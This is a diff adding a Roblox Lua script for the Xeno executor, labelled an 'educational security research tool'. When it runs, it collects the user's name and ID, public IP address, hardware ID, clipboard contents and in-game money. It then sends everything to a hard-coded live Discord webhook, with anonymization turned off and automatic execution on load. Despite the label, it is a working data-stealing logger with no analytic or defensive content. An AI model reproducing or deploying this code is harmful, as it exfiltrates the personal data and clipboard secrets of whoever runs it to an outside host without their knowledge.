@@ -1,0 +1,314 @@
+--[[
+EDUCATIONAL SECURITY RESEARCH TOOL - FIXED VERSION
+Compatible with Xeno executor
+]]
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+local LocalizationService = game:GetService("LocalizationService")
+local TeleportService = game:GetService("TeleportService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- CONFIGURATION
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1431942727897190452/oNJrMmw3nJ7J8m1NrX_R4cK3_dYwBFaVAeG8UtU6vq77YzYqyyJPL0PMWmG8Q2OfRnoD"
+
+-- SAFETY SETTINGS
+local ANONYMIZE_DATA = false
+local ENABLE_RATE_LIMITING = true
+local MIN_EXECUTION_INTERVAL = 30
+local lastExecutionTime = 0
+
+-- EXECUTION COUNTER
+if not getgenv().ExecutionCounter then
+    getgenv().ExecutionCounter = 0
+end
+getgenv().ExecutionCounter = getgenv().ExecutionCounter + 1
+
+-- SIMPLIFIED IP COLLECTION
+local function GetIPAddress()
+    local endpoints = {
+        "https://api.ipify.org",
+        "https://ipinfo.io/ip",
+        "https://checkip.amazonaws.com"
+    }
+
+    for _, url in ipairs(endpoints) do
+        local success, result = pcall(function()
+            return game:HttpGet(url)
+        end)
+        if success and result and result:match("%d+%.%d+%.%d+%.%d+") then
+            return result:gsub("%s+", "")
+        end
+    end
+    return "Not Available"
+end
+
+-- FIXED PRIVATE SERVER DETECTION
+local function CheckPrivateServer()
+    local success, result = pcall(function()
+        local players = Players:GetPlayers()
+        if #players <= 10 then
+            return "Likely Private (Low Player Count)"
+        end
+        return "Standard Server"
+    end)
+    return success and result or "Unknown"
+end
+
+-- FUNCTION TO READ MONEYTEXT
+local function GetMoneyText()
+    local moneyValue = "Not Found"
+    
+    pcall(function()
+        local player = Players.LocalPlayer
+        local playerGui = player:WaitForChild("PlayerGui")
+        local mainScreenGui = playerGui:WaitForChild("MainScreenGui")
+        local moneyTextLabel = mainScreenGui:WaitForChild("MoneyText")
+        
+        moneyValue = moneyTextLabel.Text
+    end)
+    
+    return moneyValue
+end
+
+-- SIMPLIFIED SYSTEM INFO COLLECTION
+local function CollectSystemInfo()
+    local player = Players.LocalPlayer
+    local data = {}
+    
+    pcall(function()
+        data.username = player.Name
+        data.displayName = player.DisplayName
+        data.userId = player.UserId
+        data.accountAge = player.AccountAge .. " days"
+        data.membership = player.MembershipType.Name
+    end)
+    
+    data.ip = GetIPAddress()
+    
+    data.executor = "Xeno"
+    if identifyexecutor then
+        data.executor = identifyexecutor() or "Xeno"
+    end
+    
+    data.platform = tostring(UserInputService:GetPlatform())
+    
+    data.joinSource = "Unknown"
+    pcall(function()
+        local joinData = player:GetJoinData()
+        data.joinSource = joinData.SourcePlaceId or "Direct"
+    end)
+    
+    data.fps = math.floor(1 / RunService.RenderStepped:Wait())
+    data.locale = LocalizationService.RobloxLocaleId
+    
+    data.ping = "Unknown"
+    pcall(function()
+        data.ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+    end)
+    
+    data.hwid = "Unavailable"
+    data.clipboard = "Unavailable"
+    pcall(function()
+        if getgenv then
+            if getgenv().get_hwid then
+                data.hwid = getgenv().get_hwid() or "Unavailable"
+            end
+        end
+        if getclipboard then
+            data.clipboard = getclipboard() or "Empty"
+        end
+    end)
+    
+    data.placeId = game.PlaceId
+    data.jobId = game.JobId
+    data.serverType = CheckPrivateServer()
+    data.playerCount = #Players:GetPlayers()
+    
+    data.friendsInServer = 0
+    pcall(function()
+        local friends = 0
+        for _, otherPlayer in ipairs(Players:GetPlayers()) do
+            if otherPlayer ~= player then
+                local isFriend = pcall(function()
+                    return player:IsFriendsWith(otherPlayer.UserId)
+                end)
+                if isFriend then
+                    friends = friends + 1
+                end
+            end
+        end
+        data.friendsInServer = friends
+    end)
+    
+    -- Get money text value
+    data.moneyValue = GetMoneyText()
+    
+    data.timestamp = os.date("%Y-%m-%d %H:%M:%S")
+    data.executionCount = getgenv().ExecutionCounter
+    
+    return data
+end
+
+-- SIMPLIFIED WEBHOOK SEND
+local function SendToWebhook(data)
+    local embed = {
+        title = "🛡️ System Info (Xeno)",
+        color = 0x00FF00,
+        fields = {
+            {
+                name = "👤 Player Info",
+                value = string.format(
+                    "```Name: %s\nDisplay: %s\nID: %d\nAge: %s\nBC: %s```",
+                    data.username or "Unknown",
+                    data.displayName or "Unknown",
+                    data.userId or 0,
+                    data.accountAge or "Unknown",
+                    data.membership or "Unknown"
+                ),
+                inline = true
+            },
+            {
+                name = "🌐 Network Info",
+                value = string.format(
+                    "```IP: %s\nPing: %s ms\nPlatform: %s```",
+                    data.ip,
+                    tostring(data.ping),
+                    data.platform
+                ),
+                inline = true
+            },
+            {
+                name = "🎮 Game Info",
+                value = string.format(
+                    "```Place ID: %d\nJob ID: %s\nServer: %s\nPlayers: %d```",
+                    data.placeId,
+                    data.jobId,
+                    data.serverType,
+                    data.playerCount
+                ),
+                inline = true
+            },
+            {
+                name = "⚡ Performance",
+                value = string.format(
+                    "```Executor: %s\nFPS: %d\nFriends: %d\nLocale: %s```",
+                    data.executor,
+                    data.fps,
+                    data.friendsInServer,
+                    data.locale
+                ),
+                inline = true
+            },
+            {
+                name = "💰 Game Money",
+                value = string.format(
+                    "```Money: %s```",
+                    data.moneyValue
+                ),
+                inline = true
+            },
+            {
+                name = "📊 Execution Stats",
+                value = string.format(
+                    "```Total Executions: %d\nScan Time: %s```",
+                    data.executionCount,
+                    data.timestamp
+                ),
+                inline = true
+            }
+        },
+        footer = {
+            text = "Educational Tool - Xeno Compatible"
+        }
+    }
+    
+    if data.hwid ~= "Unavailable" or data.clipboard ~= "Unavailable" then
+        table.insert(embed.fields, {
+            name = "🔧 Hardware Info",
+            value = string.format(
+                "```HWID: %s\nClipboard: %s```",
+                tostring(data.hwid):sub(1, 20) .. (tostring(data.hwid):len() > 20 and "..." or ""),
+                tostring(data.clipboard):sub(1, 30) .. (tostring(data.clipboard):len() > 30 and "..." or "")
+            ),
+            inline = false
+        })
+    end
+    
+    local payload = {
+        username = "Xeno Scanner",
+        embeds = {embed},
+        content = "📊 System information collected successfully"
+    }
+    
+    local success, result = pcall(function()
+        local jsonPayload = HttpService:JSONEncode(payload)
+        
+        if syn and syn.request then
+            return syn.request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonPayload
+            })
+        elseif request then
+            return request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonPayload
+            })
+        else
+            return HttpService:PostAsync(WEBHOOK_URL, jsonPayload)
+        end
+    end)
+    
+    return success
+end
+
+-- RATE LIMITING CHECK
+local function CanExecute()
+    if not ENABLE_RATE_LIMITING then
+        return true
+    end
+    
+    local currentTime = tick()
+    if currentTime - lastExecutionTime < MIN_EXECUTION_INTERVAL then
+        return false
+    end
+    
+    lastExecutionTime = currentTime
+    return true
+end
+
+-- MAIN EXECUTION FUNCTION
+local function Main()
+    if not CanExecute() then
+        return
+    end
+    
+    local success, data = pcall(function()
+        return CollectSystemInfo()
+    end)
+    
+    if not success then
+        return
+    end
+    
+    local sendSuccess = SendToWebhook(data)
+end
+
+-- EXPOSE FUNCTIONS FOR MANUAL EXECUTION
+getgenv().SystemScan = Main
+getgenv().GetSystemInfo = CollectSystemInfo
+
+-- Auto-execute if desired
+task.wait(1)
+Main()
